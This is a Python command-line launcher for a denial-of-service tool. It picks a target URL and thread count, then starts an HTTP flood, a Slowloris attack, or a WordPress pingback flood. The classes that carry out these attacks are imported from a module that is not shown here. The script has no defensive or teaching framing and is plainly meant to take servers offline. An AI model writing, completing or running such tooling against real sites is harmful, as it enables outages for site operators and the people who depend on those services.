import argparse
import json
import sys
import time
from core import HTTPFlood, SlowLorisAttack, WordPressPingback

def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except:
        return {}

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--method', choices=['http', 'slowloris', 'wordpress'])
    parser.add_argument('--target')
    parser.add_argument('--threads', type=int, default=200)
    
    args = parser.parse_args()
    config = load_config()
    
    target = args.target or config.get('target_url', 'http://127.0.0.1')
    method = args.method or config.get('attack_method', 'http')
    
    if method == 'http':
        flood = HTTPFlood(target, thread_count=args.threads or config.get('threads', 200))
        flood.start()
    elif method == 'slowloris':
        host = target.replace('http://', '').replace('https://', '').split('/')[0]
        slow = SlowLorisAttack(host, sockets_count=config.get('slowloris_sockets', 200))
        slow.start()
    elif method == 'wordpress':
        wp = WordPressPingback(target)
        wp.start(threads=config.get('wordpress_threads', 10))

if __name__ == "__main__":
    main()